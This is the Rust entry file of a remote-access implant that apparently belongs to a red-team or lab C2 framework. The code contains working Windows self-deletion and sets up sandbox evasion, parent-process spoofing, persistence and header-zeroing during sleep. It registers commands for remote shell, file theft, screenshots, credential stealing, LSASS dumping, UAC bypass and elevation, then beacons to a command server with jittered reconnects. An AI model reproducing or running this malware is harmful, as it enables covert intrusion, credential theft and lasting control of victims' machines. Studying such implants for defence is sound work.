// Hide console window on Windows in release builds.
// Debug keeps the console so stderr output is visible during development.
#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]

/// Log to stderr in debug/test builds only. Silent in release.
#[macro_export]
macro_rules! dbg_log {
    ($($arg:tt)*) => {
        {
            #[cfg(debug_assertions)]
            {
                eprintln!($($arg)*);
            }
        }
    };
}

mod checkin;
mod commands;
mod config;
mod dispatcher;
mod evasion;
mod persistence;
mod platform;
mod transport;
#[cfg(feature = "http-transport")]
mod tunnel_client;

use commands::{
    file_download, file_list, persist_remove, persist_status, process_list, screenshot, shell,
    steal,
};
#[cfg(feature = "http-transport")]
use commands::{portfwd, socks5};
use oxide_shared::packet::Packet;
use rand::Rng;
use std::time::Duration;

const RECONNECT_BASE: f64 = 1.0;
const RECONNECT_MAX: f64 = 60.0;
const RECONNECT_JITTER: f64 = 0.25;

/// Delete the binary at `path` while the process continues running.
/// Uses SetFileInformationByHandle with FileDispositionInfoEx:
///   FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
/// File entry is removed on handle close; the mapped image section persists.
/// No-op if the file cannot be opened with DELETE access.
#[cfg(all(target_os = "windows", feature = "stealth"))]
fn self_delete(path: &std::path::Path) {
    use std::os::windows::ffi::OsStrExt;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, SetFileInformationByHandle,
        FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO_EX, FILE_DISPOSITION_INFO_EX_FLAGS,
        FILE_DISPOSITION_FLAG_DELETE, FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
        FILE_SHARE_DELETE, FILE_SHARE_READ,
        FileDispositionInfoEx, OPEN_EXISTING, DELETE,
    };
    use windows::core::PCWSTR;

    let wide: Vec<u16> = path.as_os_str()
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();

    unsafe {
        let handle = match CreateFileW(
            PCWSTR(wide.as_ptr()),
            DELETE.0,
            FILE_SHARE_DELETE | FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        ) {
            Ok(h) if !h.is_invalid() => h,
            _ => return,
        };

        let info = FILE_DISPOSITION_INFO_EX {
            Flags: FILE_DISPOSITION_INFO_EX_FLAGS(
                FILE_DISPOSITION_FLAG_DELETE.0 | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS.0,
            ),
        };
        let _ = SetFileInformationByHandle(
            handle,
            FileDispositionInfoEx,
            &info as *const _ as *const core::ffi::c_void,
            std::mem::size_of::<FILE_DISPOSITION_INFO_EX>() as u32,
        );
        let _ = windows::Win32::Foundation::CloseHandle(handle);
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // IMPORTANT: evasion::init() may call std::process::exit(0) for sandbox detection.
    // It must remain the first statement. Do not insert anything before this line
    // that allocates Drop resources or opens handles.
    evasion::init();

    // Spoof PPID to explorer.exe on first run.
    // May exit current process — child continues with spoofed parent.
    unsafe { evasion::ppid::spoof_if_needed(); }

    // Install ring as the default rustls crypto provider. Required when both
    // reqwest (ring) and tokio-tungstenite (aws-lc-rs) pull different backends.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let config = config::Config::lab_default();

    let mut dispatch = dispatcher::Dispatcher::new();
    dispatch.register("shell", Box::new(shell::ShellHandler));
    dispatch.register("file_list", Box::new(file_list::FileListHandler));
    dispatch.register(
        "file_download",
        Box::new(file_download::FileDownloadHandler),
    );
    dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
    dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
    dispatch.register(
        "persist_status",
        Box::new(persist_status::PersistStatusHandler),
    );
    dispatch.register(
        "persist_remove",
        Box::new(persist_remove::PersistRemoveHandler),
    );
    dispatch.register("steal", Box::new(steal::StealHandler));

    #[cfg(target_os = "windows")]
    {
        use commands::lsass_dump;
        dispatch.register("lsass_dump", Box::new(lsass_dump::LsassDumpHandler));
        use commands::uac_bypass;
        dispatch.register("uac_bypass", Box::new(uac_bypass::UacBypassHandler));
        use commands::elevate;
        dispatch.register("elevate", Box::new(elevate::ElevateHandler));
    }

    #[cfg(feature = "http-transport")]
    {
        dispatch.register(
            "socks5_start",
            Box::new(socks5::Socks5StartHandler::new(config.clone())),
        );
        dispatch.register(
            "portfwd_add",
            Box::new(portfwd::PortFwdHandler::new(config.clone())),
        );
    }

    let stable_path = persistence::copy_to_stable().unwrap_or_else(|_e| {
        dbg_log!("[!] copy_to_stable: {_e}");
        std::env::current_exe().unwrap_or_default()
    });

    // Delete original binary from disk after copying to stable path.
    // Guard: skip if already running from stable path (e.g., on persistence re-launch).
    #[cfg(all(target_os = "windows", feature = "stealth"))]
    {
        if let Ok(current) = std::env::current_exe() {
            if current != stable_path {
                self_delete(&current);
                dbg_log!("[+] self-delete: {}", current.display());
            }
        }
    }

    let chain = persistence::get_chain();
    for r in &chain.install_first_available(&stable_path) {
        #[allow(clippy::if_same_then_else)]
        if r.installed {
            dbg_log!("[+] Persistence installed: {}", r.name);
        } else {
            dbg_log!(
                "[!] Persistence failed ({}): {}",
                r.name,
                r.error.as_deref().unwrap_or("?")
            );
        }
    }

    let mut backoff = RECONNECT_BASE;
    loop {
        dbg_log!("[*] Connecting to {}:{}...", config.host, config.port);

        #[cfg(feature = "http-transport")]
        let result = match transport::HttpTransport::connect(&config).await {
            Ok(mut t) => {
                dbg_log!("[+] HTTP transport ready");
                backoff = RECONNECT_BASE;
                t.run(&dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        #[cfg(not(feature = "http-transport"))]
        let result = match transport::TlsTransport::connect(&config).await {
            Ok(mut t) => {
                dbg_log!("[+] TLS handshake complete");
                backoff = RECONNECT_BASE;
                run_tls_session(&mut t, &dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        if let Err(_e) = result {
            dbg_log!("[!] Session ended: {_e}");
        }
        let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
        let delay = backoff * (1.0 + jitter);
        dbg_log!("[*] Reconnecting in {delay:.1}s...");
        unsafe { evasion::sleep::zero_headers(); }
        tokio::time::sleep(Duration::from_secs_f64(delay)).await;
        unsafe { evasion::sleep::restore_headers(); }
        backoff = (backoff * 2.0).min(RECONNECT_MAX);
    }
}

async fn run_tls_session(
    transport: &mut transport::TlsTransport,
    dispatch: &dispatcher::Dispatcher,
    chain: &persistence::PersistenceChain,
) -> anyhow::Result<()> {
    let checkin_pkt = checkin::build_checkin_packet(&chain.check_all());
    transport.send(checkin_pkt).await?;

    let ack = transport.receive().await?;
    let _session_id = ack.data["session_id"].as_str().unwrap_or("?");
    dbg_log!("[+] Registered, session: {_session_id}");

    loop {
        let packet = transport.receive().await?;
        match packet.packet_type.as_str() {
            "command" => {
                transport.send(dispatch.dispatch(&packet)).await?;
            }
            "heartbeat" => {
                transport
                    .send(Packet::new("heartbeat", serde_json::json!({})))
                    .await?;
            }
            _other => dbg_log!("[!] Unknown packet type: {_other}"),
        }
    }
}
